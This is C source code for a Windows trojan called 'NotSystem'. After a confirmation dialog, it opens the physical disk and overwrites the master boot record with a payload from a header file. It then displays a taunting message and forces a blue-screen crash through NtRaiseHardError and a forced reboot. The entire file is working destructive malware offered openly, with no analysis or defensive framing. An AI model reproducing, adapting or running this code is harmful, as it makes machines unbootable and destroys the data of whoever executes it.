#include <windows.h>
#include "NotSystem.h"
void mbr() {
	DWORD dwBytesWritten;
	HANDLE hDevice = CreateFileW(
		L"\\\\.\\PhysicalDrive0", GENERIC_ALL,
		FILE_SHARE_READ | FILE_SHARE_WRITE, 0,
		OPEN_EXISTING, 0, 0);

	WriteFile(hDevice, MasterBootRecord, 65024, &dwBytesWritten, 0);
	CloseHandle(hDevice);
}

// 
void bsod() {
	HMODULE ntdll = LoadLibraryA("ntdll");
	FARPROC RtlAdjustPrivilege = GetProcAddress(ntdll, "RtlAdjustPrivilege");
	FARPROC NtRaiseHardError = GetProcAddress(ntdll, "NtRaiseHardError");

	if (RtlAdjustPrivilege != NULL && NtRaiseHardError != NULL) {
		BOOLEAN tmp1; DWORD tmp2;
		((void(*)(DWORD, DWORD, BOOLEAN, LPBYTE))RtlAdjustPrivilege)(19, 1, 0, &tmp1);
		((void(*)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD))NtRaiseHardError)(0xc0000022, 0, 0, 0, 6, &tmp2);
	}

	// If the computer is still running, do it the normal way
	HANDLE token;
	TOKEN_PRIVILEGES privileges;

	OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token);

	LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &privileges.Privileges[0].Luid);
	privileges.PrivilegeCount = 1;
	privileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	AdjustTokenPrivileges(token, FALSE, &privileges, 0, (PTOKEN_PRIVILEGES)NULL, 0);

	// The actual restart
	ExitWindowsEx(EWX_REBOOT | EWX_FORCE, SHTDN_REASON_MAJOR_HARDWARE | SHTDN_REASON_MINOR_DISK);
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
	if (MessageBoxW(NULL, L"WARNING\n\nThis program is a trojan/malware, do not run it unless it is in a controlled environment\n\nDo you really want to run it?", L"NotSystem", MB_ICONWARNING | MB_YESNO) != IDYES) return 1;
	mbr();
	MessageBoxW(NULL, L"Your system was destroyed by NotSystem, There's nothing you can do, the only thing you can do is cry, your MBR(Master boot record) has been overwritten, so if you restart your computer, your system will be unrecoverable, even if you use a external windows installation cd-rom with the command bootrec\n\nIf you press OK in this window, your system will immediately show a blue screen(BSOD) and restart\n\n\nI'm not kidding\nHave a good day! :D", L"NotSystem", MB_OK | MB_ICONERROR);
	bsod();
	return 0;
}